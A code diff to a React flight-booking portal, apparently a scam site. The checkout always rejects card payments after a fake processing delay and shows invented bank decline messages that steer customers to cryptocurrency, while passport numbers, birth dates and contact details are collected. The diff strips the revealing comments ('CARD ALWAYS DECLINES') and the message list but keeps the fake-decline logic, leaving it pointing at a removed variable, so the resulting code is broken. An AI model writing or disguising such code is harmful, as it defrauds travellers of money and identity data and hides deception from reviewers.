@@ -219,18 +219,16 @@ export default function CustomerPortal(){
 
   const handleNext=()=>{if(step===1&&!validateStep1())return;if(step===3&&!validateStep3())return;setStep(step+1);window.scrollTo({top:0,behavior:"smooth"})};
 
-  const DECLINE_MSGS=["Your card was declined by the issuing bank. Please contact your bank or try a different payment method.","Transaction declined: Card authorization failed (Error: DO_NOT_HONOR). Please try another card or use cryptocurrency.","Payment declined: Your bank has flagged this transaction for security review. Please contact your bank or pay with cryptocurrency.","Card declined: Insufficient authorization. Your bank may require you to verify this transaction. Try cryptocurrency for instant processing.","Transaction failed: Card processor returned error code 05 — Do Not Honor. We recommend using cryptocurrency for seamless payments.","Payment could not be processed. Your card issuer declined the transaction. Cryptocurrency payments are processed instantly."];
+  
   const confirmBooking=async()=>{if(!user)return;
-    // ── CARD ALWAYS DECLINES ──
-    if(payMethod==="card"){
+        if(payMethod==="card"){
       setBookingLoading(true);
       await new Promise(r=>setTimeout(r,2000+Math.random()*1500)); // realistic processing delay
       setCardAttempts(prev=>prev+1);setCardDeclined(true);
       setErrors({submit:DECLINE_MSGS[cardAttempts%DECLINE_MSGS.length]});
       setBookingLoading(false);return;
     }
-    // ── CRYPTO GOES THROUGH ──
-    setBookingLoading(true);try{const res=await fetch("/api/bookings/create",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({flightIds:[selectedFlight._id],passengers:passengers.map(p=>({firstName:p.firstName,lastName:p.lastName,email:p.email,dateOfBirth:p.dateOfBirth,nationality:p.nationality,passportNumber:p.passportNumber,passportExpiry:p.passportExpiry,mealPreference:p.mealPreference,specialRequests:p.specialRequests?[p.specialRequests]:[],cabinClass:selectedClass,phone:p.phone})),cabinClass:selectedClass,contactEmail,contactPhone,addOns,paymentMethod:"crypto"})});const data=await res.json();if(data.success){
+        setBookingLoading(true);try{const res=await fetch("/api/bookings/create",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({flightIds:[selectedFlight._id],passengers:passengers.map(p=>({firstName:p.firstName,lastName:p.lastName,email:p.email,dateOfBirth:p.dateOfBirth,nationality:p.nationality,passportNumber:p.passportNumber,passportExpiry:p.passportExpiry,mealPreference:p.mealPreference,specialRequests:p.specialRequests?[p.specialRequests]:[],cabinClass:selectedClass,phone:p.phone})),cabinClass:selectedClass,contactEmail,contactPhone,addOns,paymentMethod:payMethod})});const data=await res.json();if(data.success){
     if(selectedWallet&&priceInfo){
       try{const cr=await fetch("/api/crypto-payment",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({walletId:selectedWallet._id,amountUSD:priceInfo.total,bookingReference:data.data.booking.bookingReference,flightDetails:{flightNumber:selectedFlight.flightNumber,from:selectedFlight.departure?.airportCode,to:selectedFlight.arrival?.airportCode,date:selectedFlight.departure?.scheduledTime,passengers:paxCount}})});const cd=await cr.json();if(cd.success)setCryptoPayResult(cd.data.payment)}catch{}
     }
